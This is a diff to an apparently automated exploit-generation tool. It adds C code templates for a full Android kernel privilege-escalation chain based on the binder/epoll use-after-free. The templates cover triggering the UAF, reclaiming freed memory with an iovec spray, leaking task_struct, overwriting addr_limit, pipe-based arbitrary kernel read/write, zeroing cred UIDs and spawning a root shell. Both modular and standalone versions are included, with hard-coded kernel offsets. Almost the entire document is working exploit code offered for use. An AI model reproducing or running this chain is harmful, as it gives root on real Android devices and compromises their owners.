@@ -212,6 +212,389 @@ static int binder_fd = -1;
             platform="android"
         ))
         
+        # ============== BINDER EPOLL UAF - IOVEC CORRUPTION ==============
+        
+        self.register(CodeTemplate(
+            action_name="setup_binder_epoll",
+            description="Setup binder device with epoll for UAF exploitation",
+            includes=[
+                "<stdio.h>", "<stdlib.h>", "<string.h>", "<unistd.h>", "<fcntl.h>",
+                "<sys/ioctl.h>", "<sys/epoll.h>", "<sys/socket.h>", "<sys/mman.h>",
+                "<linux/android/binder.h>"
+            ],
+            globals="""
+// Binder epoll UAF state
+static int binder_fd = -1;
+static int epfd = -1;
+static struct epoll_event binder_event = {0};
+static int sockfd[2] = {-1, -1};
+
+#define BINDER_THREAD_EXIT 0x40046208
+""",
+            setup_code="""
+    // Setup socket pair for blocking iovec read
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd) < 0) {
+        perror("[-] socketpair failed");
+        return -1;
+    }
+    
+    // Open binder device
+    binder_fd = open("/dev/binder", O_RDWR);
+    if (binder_fd < 0) {
+        perror("[-] Failed to open /dev/binder");
+        return -1;
+    }
+    printf("[+] Opened binder: fd=%d\\n", binder_fd);
+    
+    // mmap binder - this creates binder_thread
+    void *binder_map = mmap(NULL, 0x200000, PROT_READ, MAP_SHARED, binder_fd, 0);
+    if (binder_map == MAP_FAILED) {
+        perror("[-] Failed to mmap binder");
+        return -1;
+    }
+    
+    // Create epoll and register binder fd
+    epfd = epoll_create1(0);
+    if (epfd < 0) {
+        perror("[-] epoll_create1 failed");
+        return -1;
+    }
+    
+    binder_event.events = EPOLLIN;
+    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &binder_event) < 0) {
+        perror("[-] epoll_ctl ADD failed");
+        return -1;
+    }
+    printf("[+] Binder registered with epoll\\n");
+""",
+            main_code="""
+    // Binder + epoll setup complete
+    printf("[+] Binder epoll setup complete\\n");
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="setup_iovec_spray",
+            description="Setup iovec array for reclaiming freed binder_thread",
+            includes=["<sys/uio.h>"],
+            globals="""
+// iovec spray state
+#define IOVEC_COUNT 13
+#define IOVEC_OFFSET 10  // Index in iovec array that will be corrupted
+
+static struct iovec iovec_array[IOVEC_COUNT];
+static char iovec_buffer[0x1000];
+""",
+            setup_code="""
+    // Initialize iovec array
+    memset(iovec_array, 0, sizeof(iovec_array));
+    memset(iovec_buffer, 'A', sizeof(iovec_buffer));
+""",
+            main_code="""
+    // Setup iovec for heap spray
+    // Each iov_base and iov_len will reclaim freed binder_thread memory
+    for (int i = 0; i < IOVEC_COUNT; i++) {
+        if (i == IOVEC_OFFSET) {
+            // This slot will be corrupted via epoll
+            iovec_array[i].iov_base = NULL;  // Will be overwritten
+            iovec_array[i].iov_len = 0;      // Will be overwritten
+        } else {
+            iovec_array[i].iov_base = &iovec_buffer[i * 0x10];
+            iovec_array[i].iov_len = 0x10;
+        }
+    }
+    printf("[+] iovec spray configured\\n");
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="trigger_binder_uaf",
+            description="Trigger UAF by exiting binder thread while epoll holds reference",
+            globals="""
+static volatile int uaf_triggered = 0;
+""",
+            main_code="""
+    // Fork a child to handle epoll_ctl DEL timing
+    pid_t cpid = fork();
+    if (cpid == 0) {
+        // Child process: wait then unregister from epoll
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        sleep(2);  // Wait for parent to call recvmsg
+        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &binder_event);
+        // After DEL, write to socket to unblock recvmsg
+        write(sockfd[1], "X", 1);
+        _exit(0);
+    }
+    
+    // Parent: Exit binder thread - this frees binder_thread struct
+    // BUT epoll still holds a reference via ep_item
+    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+    printf("[+] BINDER_THREAD_EXIT called - thread freed\\n");
+    uaf_triggered = 1;
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="reclaim_with_iovec",
+            description="Reclaim freed binder_thread memory with iovec",
+            globals="",
+            main_code="""
+    // Setup message header with our iovec array
+    struct msghdr msg = {0};
+    msg.msg_iov = iovec_array;
+    msg.msg_iovlen = IOVEC_COUNT;
+    
+    // recvmsg will block because socket is empty
+    // The kernel will copy our iovec array to kernel memory
+    // This reclaims the freed binder_thread (same slab: kmalloc-512)
+    printf("[*] Calling recvmsg to reclaim freed memory...\\n");
+    ssize_t ret = recvmsg(sockfd[0], &msg, MSG_WAITALL);
+    
+    // Wait for child
+    waitpid(cpid, NULL, 0);
+    
+    printf("[+] recvmsg returned %zd\\n", ret);
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="corrupt_iovec_via_epoll",
+            description="Trigger corruption of iovec via epoll UAF dereference",
+            globals="",
+            main_code="""
+    // When epoll_ctl DEL runs in child process:
+    // 1. It dereferences ep_item->wq (which was binder_thread's wait_queue)
+    // 2. But that memory is now our iovec array
+    // 3. The wq operations write to our iovec, giving us control
+    //
+    // Specifically, it corrupts iovec_array[IOVEC_OFFSET] because:
+    // - ep_item points into freed binder_thread
+    // - ep_item's wait queue cleanup writes to what used to be binder_thread
+    // - That memory is now our iovec array
+    
+    printf("[+] iovec corruption should have occurred via epoll UAF\\n");
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="leak_task_struct",
+            description="Leak kernel task_struct address using corrupted iovec",
+            globals="""
+static unsigned long leaked_task_struct = 0;
+
+// task_struct field offsets (kernel 5.10.107 arm64)
+#define TASK_CRED_OFFSET  0x688
+#define TASK_PID_OFFSET   0x4e8
+#define ADDR_LIMIT_OFFSET 0xa18
+""",
+            main_code="""
+    // After iovec corruption, iov_base may point to kernel memory
+    // We can leak task_struct by reading current thread's stack
+    // The kernel stores task pointer in thread_info
+    
+    // First, check if our iovec was corrupted
+    if (iovec_array[IOVEC_OFFSET].iov_base != NULL) {
+        unsigned long *leaked = (unsigned long *)iovec_array[IOVEC_OFFSET].iov_base;
+        // Parse leaked data to find task_struct pointer
+        // This depends on what the epoll UAF gives us
+        leaked_task_struct = leaked[0];  // Adjust offset as needed
+        printf("[+] Leaked task_struct: 0x%lx\\n", leaked_task_struct);
+    } else {
+        // Alternative: use corrupted length to read OOB
+        printf("[!] Need to implement alternative leak method\\n");
+    }
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="setup_addr_limit_overwrite",
+            description="Setup second UAF iteration to overwrite addr_limit",
+            globals="""
+static int binder_fd2 = -1;
+static int epfd2 = -1;
+static struct iovec iovec_array2[IOVEC_COUNT];
+""",
+            main_code="""
+    // Setup second binder/epoll for addr_limit overwrite
+    binder_fd2 = open("/dev/binder", O_RDWR);
+    void *binder_map2 = mmap(NULL, 0x200000, PROT_READ, MAP_SHARED, binder_fd2, 0);
+    
+    epfd2 = epoll_create1(0);
+    struct epoll_event ev2 = {.events = EPOLLIN};
+    epoll_ctl(epfd2, EPOLL_CTL_ADD, binder_fd2, &ev2);
+    
+    // Setup iovec to write to addr_limit
+    for (int i = 0; i < IOVEC_COUNT; i++) {
+        if (i == IOVEC_OFFSET) {
+            // Target addr_limit in task_struct
+            iovec_array2[i].iov_base = (void *)(leaked_task_struct + ADDR_LIMIT_OFFSET);
+            iovec_array2[i].iov_len = 8;
+        } else {
+            iovec_array2[i].iov_base = iovec_buffer;
+            iovec_array2[i].iov_len = 8;
+        }
+    }
+    printf("[+] Setup for addr_limit overwrite at 0x%lx\\n", leaked_task_struct + ADDR_LIMIT_OFFSET);
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="overwrite_addr_limit",
+            description="Overwrite addr_limit to gain kernel R/W",
+            globals="""
+static volatile int addr_limit_overwritten = 0;
+static unsigned long new_addr_limit = 0xFFFFFFFFFFFFFFFEUL;
+""",
+            main_code="""
+    // Trigger second UAF to overwrite addr_limit
+    pid_t cpid2 = fork();
+    if (cpid2 == 0) {
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        sleep(2);
+        struct epoll_event ev2 = {.events = EPOLLIN};
+        epoll_ctl(epfd2, EPOLL_CTL_DEL, binder_fd2, &ev2);
+        // Write new addr_limit value
+        write(sockfd[1], &new_addr_limit, 8);
+        _exit(0);
+    }
+    
+    ioctl(binder_fd2, BINDER_THREAD_EXIT, NULL);
+    
+    struct msghdr msg2 = {0};
+    msg2.msg_iov = iovec_array2;
+    msg2.msg_iovlen = IOVEC_COUNT;
+    recvmsg(sockfd[0], &msg2, MSG_WAITALL);
+    
+    waitpid(cpid2, NULL, 0);
+    
+    printf("[+] addr_limit overwritten!\\n");
+    addr_limit_overwritten = 1;
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="kernel_read_primitive",
+            description="Read from arbitrary kernel address using pipe",
+            globals="""
+static unsigned long kernel_read(unsigned long addr, size_t len) {
+    int pipefd[2];
+    if (pipe(pipefd) < 0) return 0;
+    
+    // With addr_limit bypassed, we can read from kernel addresses
+    ssize_t n = write(pipefd[1], (void *)addr, len);
+    close(pipefd[1]);
+    
+    if (n != len) {
+        close(pipefd[0]);
+        return 0;
+    }
+    
+    unsigned long value = 0;
+    read(pipefd[0], &value, len);
+    close(pipefd[0]);
+    return value;
+}
+""",
+            main_code="""
+    // Test kernel read
+    if (addr_limit_overwritten && leaked_task_struct) {
+        unsigned long test_read = kernel_read(leaked_task_struct, 8);
+        printf("[+] Kernel read test: 0x%lx\\n", test_read);
+    }
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="kernel_write_primitive",
+            description="Write to arbitrary kernel address using pipe",
+            globals="""
+static int kernel_write_val(unsigned long addr, unsigned long value, size_t len) {
+    int pipefd[2];
+    if (pipe(pipefd) < 0) return -1;
+    
+    ssize_t n = write(pipefd[1], &value, len);
+    close(pipefd[1]);
+    
+    if (n != len) {
+        close(pipefd[0]);
+        return -1;
+    }
+    
+    // With addr_limit bypassed, we can write to kernel addresses
+    n = read(pipefd[0], (void *)addr, len);
+    close(pipefd[0]);
+    return (n == len) ? 0 : -1;
+}
+""",
+            main_code="""
+    // Kernel write primitive ready
+    printf("[+] Kernel write primitive enabled\\n");
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="overwrite_cred",
+            description="Overwrite cred structure to gain root",
+            globals="""
+static int escalate_privileges(unsigned long task_struct_addr) {
+    // Read cred pointer from task_struct
+    unsigned long cred_ptr = kernel_read(task_struct_addr + TASK_CRED_OFFSET, 8);
+    if (!cred_ptr) {
+        fprintf(stderr, "[-] Failed to read cred pointer\\n");
+        return -1;
+    }
+    printf("[+] cred pointer: 0x%lx\\n", cred_ptr);
+    
+    // cred structure offsets (uid, gid, etc at offset 4, 8, 12, etc.)
+    // Overwrite uid, gid, suid, sgid, euid, egid, fsuid, fsgid to 0
+    for (int offset = 4; offset <= 32; offset += 4) {
+        if (kernel_write_val(cred_ptr + offset, 0, 4) < 0) {
+            fprintf(stderr, "[-] Failed to write to cred+%d\\n", offset);
+            return -1;
+        }
+    }
+    
+    printf("[+] cred overwritten with root UIDs\\n");
+    return 0;
+}
+""",
+            main_code="""
+    // Escalate privileges
+    if (addr_limit_overwritten && leaked_task_struct) {
+        printf("[*] Overwriting cred structure...\\n");
+        if (escalate_privileges(leaked_task_struct) == 0) {
+            printf("[+] Privilege escalation successful!\\n");
+            printf("[+] uid=%d euid=%d\\n", getuid(), geteuid());
+            
+            // Spawn root shell
+            if (getuid() == 0) {
+                printf("[+] Got root! Spawning shell...\\n");
+                execl("/system/bin/sh", "sh", NULL);
+            }
+        }
+    }
+""",
+            cleanup_code="""
+    if (binder_fd >= 0) close(binder_fd);
+    if (binder_fd2 >= 0) close(binder_fd2);
+    if (epfd >= 0) close(epfd);
+    if (epfd2 >= 0) close(epfd2);
+    if (sockfd[0] >= 0) close(sockfd[0]);
+    if (sockfd[1] >= 0) close(sockfd[1]);
+""",
+            platform="android"
+        ))
+        
         # ============== HEAP SPRAY TECHNIQUES ==============
         
         self.register(CodeTemplate(
@@ -1011,6 +1394,226 @@ static int jop_chain_len = 0;
     printf("[*] Package UID: %d\\n", getuid());
     printf("[*] SELinux context: ");
     system("cat /proc/self/attr/current 2>/dev/null || echo 'unknown'");
+""",
+            platform="android"
+        ))
+        
+        # ============== BINDER EXPLOITATION PRIMITIVES (STANDALONE) ==============
+        # These are self-contained implementations that don't rely on modular globals.
+        # Use these when you want a complete standalone exploit function.
+        # NOTE: Action names have _standalone suffix to avoid conflicts with modular templates.
+        
+        self.register(CodeTemplate(
+            action_name="leak_task_struct_standalone",
+            description="Leak task_struct address via binder UAF + iovec spray (standalone)",
+            includes=["<sys/epoll.h>", "<sys/ioctl.h>", "<sys/uio.h>", "<sys/mman.h>", "<sched.h>", "<sys/wait.h>"],
+            globals="""
+// Binder UAF constants
+#define BINDER_THREAD_EXIT 0x40046208UL
+#define PAGESZ 0x1000
+#define IOVEC_COUNT 25
+
+static unsigned long leaked_task_struct = 0;
+""",
+            setup_code="""
+    // Bind to single CPU for reliable racing
+    cpu_set_t cpu_set;
+    CPU_ZERO(&cpu_set);
+    CPU_SET(0, &cpu_set);
+    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
+        perror("[-] CPU binding failed");
+    }
+    printf("[+] Bound to CPU 0\\n");
+""",
+            main_code="""
+    // Leak task_struct via binder UAF
+    printf("[*] Leaking task_struct via binder UAF...\\n");
+    
+    int binder_fd = open("/dev/binder", O_RDONLY);
+    if (binder_fd < 0) { perror("open binder"); return -1; }
+    
+    int epfd = epoll_create(100);
+    if (epfd < 0) { perror("epoll_create"); return -1; }
+    
+    int pipefd[2];
+    if (pipe(pipefd) < 0) { perror("pipe"); return -1; }
+    fcntl(pipefd[0], F_SETPIPE_SZ, PAGESZ);
+    
+    // Setup iovec array for spray
+    struct iovec iovec_stack[IOVEC_COUNT];
+    memset(iovec_stack, 0, sizeof(iovec_stack));
+    
+    void *aligned_addr = mmap((void *)0x100000000UL, PAGESZ, 
+                              PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+    
+    iovec_stack[10].iov_base = aligned_addr;
+    iovec_stack[10].iov_len = PAGESZ;
+    iovec_stack[11].iov_base = aligned_addr;  // Will be clobbered with kernel ptr
+    iovec_stack[11].iov_len = PAGESZ;
+    
+    // Link binder_thread to epoll
+    struct epoll_event event = {.events = EPOLLIN};
+    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);
+    
+    pid_t cpid = fork();
+    if (cpid == 0) {
+        // Child: trigger the race
+        sleep(3);
+        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
+        char buf[PAGESZ];
+        read(pipefd[0], buf, sizeof(buf));
+        close(pipefd[1]);
+        _exit(0);
+    }
+    
+    // Parent: free binder_thread and spray
+    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+    ssize_t writesz = writev(pipefd[1], iovec_stack, IOVEC_COUNT);
+    
+    waitpid(cpid, NULL, 0);
+    
+    // Read leaked kernel address
+    char buffer[PAGESZ];
+    read(pipefd[0], buffer, sizeof(buffer));
+    leaked_task_struct = *(unsigned long*)(buffer + 0xe8);
+    
+    printf("[+] Leaked task_struct: 0x%lx\\n", leaked_task_struct);
+    
+    if (!leaked_task_struct) {
+        fprintf(stderr, "[-] Failed to leak task_struct\\n");
+        return -1;
+    }
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="overwrite_addr_limit_standalone",
+            description="Overwrite addr_limit via binder UAF + socket + recvmsg (standalone)",
+            includes=["<sys/socket.h>", "<sys/epoll.h>", "<sys/ioctl.h>", "<sys/uio.h>", "<sys/prctl.h>", "<signal.h>"],
+            globals="""
+static int addr_limit_overwritten = 0;
+""",
+            main_code="""
+    // Overwrite addr_limit for kernel AAW
+    printf("[*] Overwriting addr_limit...\\n");
+    
+    if (!leaked_task_struct) {
+        fprintf(stderr, "[-] Need task_struct first\\n");
+        return -1;
+    }
+    
+    int binder_fd2 = open("/dev/binder", O_RDONLY);
+    int epfd2 = epoll_create(100);
+    
+    int sockfd[2];
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd) < 0) {
+        perror("socketpair"); return -1;
+    }
+    
+    // Write single byte to prepare for blocking recvmsg
+    char single_byte = 'A';
+    write(sockfd[1], &single_byte, 1);
+    
+    // Setup iovec for reclaim
+    struct iovec iovec_stack2[IOVEC_COUNT];
+    memset(iovec_stack2, 0, sizeof(iovec_stack2));
+    
+    void *mem = mmap((void *)0x200000000UL, PAGESZ,
+                     PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+    
+    iovec_stack2[10].iov_base = mem;
+    iovec_stack2[10].iov_len = 1;
+    iovec_stack2[11].iov_base = (void *)0xdeadbeef;
+    iovec_stack2[11].iov_len = 0x28;
+    iovec_stack2[12].iov_base = (void *)0xcafebabe;
+    iovec_stack2[12].iov_len = 8;
+    
+    unsigned long payload[] = {
+        0x1,
+        0xdeadbeef,
+        0x28,
+        leaked_task_struct + 0xa18,  // addr_limit offset
+        0x8,
+        0xfffffffffffffffeUL         // new addr_limit
+    };
+    
+    struct msghdr message = {0};
+    message.msg_iov = iovec_stack2;
+    message.msg_iovlen = IOVEC_COUNT;
+    
+    struct epoll_event event2 = {.events = EPOLLIN};
+    epoll_ctl(epfd2, EPOLL_CTL_ADD, binder_fd2, &event2);
+    
+    pid_t cpid2 = fork();
+    if (cpid2 == 0) {
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        sleep(2);
+        epoll_ctl(epfd2, EPOLL_CTL_DEL, binder_fd2, &event2);
+        write(sockfd[1], payload, sizeof(payload));
+        _exit(0);
+    }
+    
+    ioctl(binder_fd2, BINDER_THREAD_EXIT, NULL);
+    recvmsg(sockfd[0], &message, MSG_WAITALL);
+    
+    waitpid(cpid2, NULL, 0);
+    
+    printf("[+] addr_limit overwritten at 0x%lx\\n", leaked_task_struct + 0xa18);
+    addr_limit_overwritten = 1;
+    arb_write_enabled = 1;
+    arb_read_enabled = 1;
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="kernel_read_standalone",
+            description="Read from kernel address using pipe after addr_limit bypass (standalone)",
+            globals="""
+static unsigned long kernel_read_addr(void *addr, int len) {
+    int pipefd[2];
+    if (pipe(pipefd) < 0) return 0;
+    
+    if (write(pipefd[1], addr, len) != len) {
+        close(pipefd[0]); close(pipefd[1]);
+        return 0;
+    }
+    close(pipefd[1]);
+    
+    unsigned long result = 0;
+    read(pipefd[0], &result, len);
+    close(pipefd[0]);
+    return result;
+}
+""",
+            main_code="""
+    // Kernel read primitive is now available via kernel_read_addr()
+    printf("[+] Kernel read primitive ready\\n");
+""",
+            platform="android"
+        ))
+        
+        self.register(CodeTemplate(
+            action_name="kernel_write_standalone",
+            description="Write to kernel address using pipe after addr_limit bypass (standalone)",
+            globals="""
+static void kernel_write_addr(void *src, void *dst, size_t len) {
+    int pipefd[2];
+    if (pipe(pipefd) < 0) return;
+    
+    if (write(pipefd[1], src, len) != len) {
+        close(pipefd[0]); close(pipefd[1]);
+        return;
+    }
+    close(pipefd[1]);
+    read(pipefd[0], dst, len);
+    close(pipefd[0]);
+}
+""",
+            main_code="""
+    // Kernel write primitive is now available via kernel_write_addr()
+    printf("[+] Kernel write primitive ready\\n");
 """,
             platform="android"
         ))
